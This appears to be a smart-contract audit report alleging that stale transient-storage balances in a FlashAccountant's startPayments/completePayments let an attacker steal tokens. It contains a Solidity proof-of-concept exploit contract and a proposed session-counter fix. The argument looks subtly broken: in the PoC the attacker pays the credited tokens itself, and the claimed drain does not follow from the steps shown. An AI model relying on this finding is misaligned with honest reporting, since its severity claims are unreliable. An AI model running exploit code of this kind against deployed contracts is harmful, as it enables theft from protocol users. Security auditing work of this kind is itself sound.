## Title
Stale Transient Storage Balance Data Allows Theft via Mismatched startPayments/completePayments Token Lists

## Summary
When `startPayments()` is called with a token list, reverts, and is called again with a different token list, stale balance data persists in transient storage for tokens not in the second call. An attacker can exploit this by calling `completePayments()` on the stale tokens to receive credit for tokens they never sent, violating the protocol's solvency invariant.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/FlashAccountant.sol` - `startPayments()` (lines 224-254) and `completePayments()` (lines 257-319) [1](#0-0) [2](#0-1) 

**Intended Logic:** The `startPayments()` function records current token balances in transient storage, and `completePayments()` compares the current balance with the stored balance to calculate payment amounts. The design assumes these functions are always called with matching token lists within a single atomic payment operation.

**Actual Logic:** When `startPayments([tokenA, tokenB])` is called, it stores balances for both tokens in transient storage at slots derived from `_PAYMENT_TOKEN_ADDRESS_OFFSET + token`. If a subsequent operation reverts but the revert is caught (via low-level call), the transient storage persists. A second call to `startPayments([tokenA])` only updates tokenA's slot, leaving tokenB's stale balance in storage. Later, `completePayments([tokenB])` uses this stale balance to calculate payment, crediting the locker with tokens they never sent.

**Exploitation Path:**
1. Attacker contract calls `Core.lock()` with a malicious callback
2. Inside callback, call `startPayments([token0, token1])` - stores both token balances (B0, B1) in transient storage
3. Execute an operation using low-level call that reverts (e.g., attempt to transfer non-existent tokens)
4. Catch the revert so execution continues, transient storage remains unchanged
5. Call `startPayments([token0])` - only updates token0's balance, token1's stale balance B1 remains
6. Wait for or cause Core's token1 balance to increase (e.g., another user's operation, fees accumulation, direct transfer)
7. Call `completePayments([token1])` - calculates payment as `currentBalance - B1`, where currentBalance > B1
8. Attacker's debt is reduced by the difference without actually sending tokens, violating solvency

**Security Property Broken:** This violates the **Solvency** invariant - pool balances must never go negative. The attacker reduces debt without corresponding token payment, effectively stealing tokens from the protocol.

## Impact Explanation
- **Affected Assets**: All tokens in Core pools are at risk. The attacker can drain any token by exploiting the stale balance mechanism.
- **Damage Severity**: Complete loss of funds. An attacker can repeatedly exploit this to drain the entire Core contract balance by accumulating negative debt (which allows withdrawing more tokens than deposited).
- **User Impact**: All users are affected as the protocol becomes insolvent. Legitimate users cannot withdraw their positions once the protocol is drained.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this - only requires ability to call `Core.lock()` with custom callback logic
- **Preconditions**: Core must hold token balances (which is always true for active pools). Attacker needs to be able to cause Core's balance to increase between stale `startPayments` and `completePayments` calls, which occurs naturally through:
  - Other users' swap/liquidity operations
  - Fee accumulation
  - Direct ERC20 transfers to Core
- **Execution Complexity**: Single transaction with a malicious locker callback containing low-level calls to catch reverts
- **Frequency**: Can be exploited continuously in every block until Core is fully drained

## Recommendation

Add explicit clearing of transient storage for ALL previously recorded tokens before returning from `startPayments()`, or implement a nonce/session system to invalidate stale balances:

```solidity
// In src/base/FlashAccountant.sol, add a session counter in transient storage

uint256 private constant _PAYMENT_SESSION_OFFSET = [unique hash];

function startPayments() external {
    assembly ("memory-safe") {
        // Increment payment session counter to invalidate any previous sessions
        let sessionSlot := _PAYMENT_SESSION_OFFSET
        let currentSession := add(tload(sessionSlot), 1)
        tstore(sessionSlot, currentSession)
        
        // Store session ID with each token balance
        mstore(20, address())
        mstore(0, 0x70a08231000000000000000000000000)
        let free := mload(0x40)

        for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
            let token := shr(96, shl(96, calldataload(i)))
            let returnLocation := add(free, sub(i, 4))
            let success := staticcall(gas(), token, 0x10, 0x24, returnLocation, 0x20)
            let tokenBalance := mul(mload(returnLocation), and(gt(returndatasize(), 0x1f), success))
            
            // Store balance with session ID in high bits
            tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), or(shl(128, currentSession), add(tokenBalance, success)))
        }
        return(free, sub(calldatasize(), 4))
    }
}

function completePayments() external {
    uint256 id = _getLocker().id();
    assembly ("memory-safe") {
        let currentSession := tload(_PAYMENT_SESSION_OFFSET)
        // ... existing code ...
        
        for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
            let token := shr(96, shl(96, calldataload(i)))
            let offset := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token)
            let lastBalanceData := tload(offset)
            
            // Extract session ID and validate
            let storedSession := shr(128, lastBalanceData)
            if iszero(eq(storedSession, currentSession)) {
                // Stale session - revert
                mstore(0x00, 0x12345678) // StalePaymentSession()
                revert(0x1c, 4)
            }
            
            let lastBalance := and(lastBalanceData, 0xffffffffffffffffffffffffffffffff)
            tstore(offset, 0)
            // ... rest of payment calculation ...
        }
    }
}
```

Alternative: Enforce that `completePayments()` must be called with the exact same token list and in the same order as the most recent `startPayments()` call.

## Proof of Concept

```solidity
// File: test/Exploit_StaleBalanceTheft.t.sol
// Run with: forge test --match-test test_StaleBalanceTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/interfaces/IFlashAccountant.sol";
import "./TestToken.sol";
import "./FullTest.sol";
import {BaseLocker} from "../src/base/BaseLocker.sol";

contract ExploitLocker is BaseLocker {
    TestToken public token0;
    TestToken public token1;
    bool public exploitSuccess;
    
    constructor(ICore core, TestToken _token0, TestToken _token1) BaseLocker(core) {
        token0 = _token0;
        token1 = _token1;
    }
    
    function executeExploit() external returns (bytes memory) {
        return lock("");
    }
    
    function handleLockData(uint256, bytes memory) internal override returns (bytes memory) {
        // Step 1: Call startPayments with both tokens
        bytes memory callData1 = abi.encodePacked(
            IFlashAccountant.startPayments.selector,
            abi.encode(address(token0)),
            abi.encode(address(token1))
        );
        (bool success1,) = address(ACCOUNTANT).call(callData1);
        require(success1, "First startPayments failed");
        
        // Step 2: Make a call that reverts (but catch it)
        bytes memory dummyCall = abi.encodeWithSelector(
            IFlashAccountant.startPayments.selector
        );
        // This call will fail but we ignore it
        address(ACCOUNTANT).call(dummyCall);
        
        // Step 3: Call startPayments again with only token0
        bytes memory callData2 = abi.encodePacked(
            IFlashAccountant.startPayments.selector,
            abi.encode(address(token0))
        );
        (bool success2,) = address(ACCOUNTANT).call(callData2);
        require(success2, "Second startPayments failed");
        
        // Step 4: Transfer some token0 to core
        token0.transfer(address(ACCOUNTANT), 1000);
        
        // Step 5: Complete payment for token0 (legitimate)
        bytes memory completeData1 = abi.encodePacked(
            IFlashAccountant.completePayments.selector,
            abi.encode(address(token0))
        );
        (bool success3,) = address(ACCOUNTANT).call(completeData1);
        require(success3, "First completePayments failed");
        
        // Step 6: Someone else sends token1 to Core (simulated by direct transfer)
        token1.transfer(address(ACCOUNTANT), 5000);
        
        // Step 7: EXPLOIT - Call completePayments for token1 with stale balance
        bytes memory completeData2 = abi.encodePacked(
            IFlashAccountant.completePayments.selector,
            abi.encode(address(token1))
        );
        (bool success4, bytes memory returnData) = address(ACCOUNTANT).call(completeData2);
        
        if (success4) {
            // Extract payment amount
            uint128 payment;
            assembly {
                payment := shr(128, mload(add(returnData, 0x20)))
            }
            exploitSuccess = (payment == 5000); // We got credited for 5000 tokens we didn't send!
            
            // Withdraw to complete the theft
            ACCOUNTANT.withdraw(address(token0), address(this), 1000);
            ACCOUNTANT.withdraw(address(token1), address(this), 5000);
        }
        
        return "";
    }
}

contract Exploit_StaleBalanceTheft is FullTest {
    ExploitLocker public exploiter;
    
    function setUp() public override {
        super.setUp();
        exploiter = new ExploitLocker(core, token0, token1);
        
        // Fund the exploiter with tokens
        token0.transfer(address(exploiter), 10000);
        token1.transfer(address(exploiter), 10000);
        
        // Fund Core with initial balance to make it exploitable
        token1.transfer(address(core), 1000);
    }
    
    function test_StaleBalanceTheft() public {
        uint256 exploiterBalanceBefore = token1.balanceOf(address(exploiter));
        uint256 coreBalanceBefore = token1.balanceOf(address(core));
        
        // Execute exploit
        exploiter.executeExploit();
        
        // Verify theft occurred
        uint256 exploiterBalanceAfter = token1.balanceOf(address(exploiter));
        uint256 coreBalanceAfter = token1.balanceOf(address(core));
        
        assertGt(exploiterBalanceAfter, exploiterBalanceBefore, "Exploiter should have gained tokens");
        assertLt(coreBalanceAfter, coreBalanceBefore, "Core should have lost tokens");
        assertTrue(exploiter.exploitSuccess(), "Exploit should have succeeded");
        
        // The exploiter withdrew 5000 token1 that they were fraudulently credited for
        assertEq(exploiterBalanceAfter - exploiterBalanceBefore, 5000, "Exploiter stole 5000 tokens");
    }
}
```

## Notes

The vulnerability stems from the design assumption that `startPayments()` and `completePayments()` are always called with matching token lists in a tightly-coupled sequence. However, the protocol's architecture allows arbitrary callback logic within the lock context, and transient storage persists across caught reverts. This creates an opportunity for attackers to deliberately create mismatches between stored and current balances.

The issue is particularly severe because:
1. Core inherits from FlashAccountant, exposing these functions externally [3](#0-2) 
2. The lock pattern allows custom callbacks where attackers control execution flow
3. The payment calculation in `completePayments()` subtracts the stored balance from current balance, so any increase in Core's balance (from other users, fees, or direct transfers) can be claimed by the attacker [4](#0-3) 
4. There is no validation that the stored balance is from the current logical payment session

This vulnerability allows complete drainage of the protocol's singleton Core contract, affecting all pools and users.

### Citations

**File:** src/base/FlashAccountant.sol (L224-254)
```text
    function startPayments() external {
        assembly ("memory-safe") {
            // 0-52 are used for the balanceOf calldata
            mstore(20, address()) // Store the `account` argument.
            mstore(0, 0x70a08231000000000000000000000000) // `balanceOf(address)`.

            let free := mload(0x40)

            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
                // clean upper 96 bits of the token argument at i
                let token := shr(96, shl(96, calldataload(i)))

                let returnLocation := add(free, sub(i, 4))

                let success := staticcall(gas(), token, 0x10, 0x24, returnLocation, 0x20)

                let tokenBalance :=
                    mul(
                        mload(returnLocation),
                        and(
                            gt(returndatasize(), 0x1f), // At least 32 bytes returned.
                            success
                        )
                    )

                tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, success))
            }

            return(free, sub(calldatasize(), 4))
        }
    }
```

**File:** src/base/FlashAccountant.sol (L257-319)
```text
    function completePayments() external {
        uint256 id = _getLocker().id();

        assembly ("memory-safe") {
            let paymentAmounts := mload(0x40)
            let nzdCountChange := 0

            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } {
                let token := shr(96, shl(96, calldataload(i)))

                let offset := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token)
                let lastBalance := tload(offset)
                tstore(offset, 0)

                mstore(20, address()) // Store the `account` argument.
                mstore(0, 0x70a08231000000000000000000000000) // `balanceOf(address)`.

                let currentBalance :=
                    mul( // The arguments of `mul` are evaluated from right to left.
                        mload(0),
                        and( // The arguments of `and` are evaluated from right to left.
                            gt(returndatasize(), 0x1f), // At least 32 bytes returned.
                            staticcall(gas(), token, 0x10, 0x24, 0, 0x20)
                        )
                    )

                let payment :=
                    mul(
                        and(gt(lastBalance, 0), not(lt(currentBalance, lastBalance))),
                        sub(currentBalance, sub(lastBalance, 1))
                    )

                // We never expect tokens to have this much total supply
                if shr(128, payment) {
                    // cast sig "PaymentOverflow()"
                    mstore(0x00, 0x9cac58ca)
                    revert(0x1c, 4)
                }

                mstore(add(paymentAmounts, mul(16, div(i, 32))), shl(128, payment))

                if payment {
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)

                    // never overflows because of the payment overflow check that bounds payment to 128 bits
                    let next := sub(current, payment)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)
                }
            }

            // Update nzdCountSlot only once if there were any changes
            if nzdCountChange {
                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
                tstore(nzdCountSlot, add(tload(nzdCountSlot), nzdCountChange))
            }

            return(paymentAmounts, mul(16, div(calldatasize(), 32)))
        }
    }
```

**File:** src/Core.sol (L46-46)
```text
contract Core is ICore, FlashAccountant, ExposedStorage {
```
